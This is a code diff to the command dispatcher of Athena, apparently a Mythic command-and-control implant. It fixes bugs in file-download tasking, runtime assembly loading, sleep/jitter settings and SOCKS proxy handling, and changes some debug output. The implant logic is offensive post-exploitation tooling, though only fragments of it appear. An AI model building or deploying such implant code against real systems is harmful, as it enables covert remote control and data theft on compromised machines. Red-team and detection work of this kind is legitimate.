@@ -31,8 +31,7 @@ namespace Athena.Commands
                         {
                             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
                             Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                            
-                            downloadJob.path = par["file"].Replace("\"", "");
+                            downloadJob.path = par["File"].Replace("\"", "");
                             downloadJob.total_chunks = downloadJob.GetTotalChunks();
                             
                             Globals.downloadJobs.Add(job.task.id, downloadJob);
@@ -130,8 +129,8 @@ namespace Athena.Commands
                             {
                                 output += $"\"status\":\"Not Started\"}},";
                             }
-                            output = output.TrimEnd(',') + "]";
                         }
+                        output = output.TrimEnd(',') + "]";
                         completeJob(ref job, output, false);
                     }, job.cancellationtokensource.Token);
                     break;
@@ -201,7 +200,7 @@ namespace Athena.Commands
                     Task.Run(() =>
                     {
                         LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
-                        completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name), false);
+                        completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.command), false);
                     }, job.cancellationtokensource.Token);
                     break;
                 //Can these all be merged into one and handled on the server-side?
@@ -249,7 +248,7 @@ namespace Athena.Commands
                     {
                         try
                         {
-                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["jitter"].ToString());
+                            Globals.mc.MythicConfig.jitter = int.Parse(sleepInfo["jitter"].ToString());
                         }
                         catch (Exception e)
                         {
@@ -268,6 +267,7 @@ namespace Athena.Commands
                     }
                     break;
                 case "socks":
+                    Console.WriteLine(job.task.parameters);
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                     if (socksInfo["action"].ToString() == "start")
                     {
@@ -390,9 +390,7 @@ namespace Athena.Commands
         {
             if (Globals.loadedcommands.ContainsKey(job.task.command))
             {
-                Misc.WriteDebug(job.task.command);
                 PluginResponse pr = AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                Misc.WriteDebug(pr.output);
                 completeJob(ref job, pr.output, !pr.success);
             }
             else
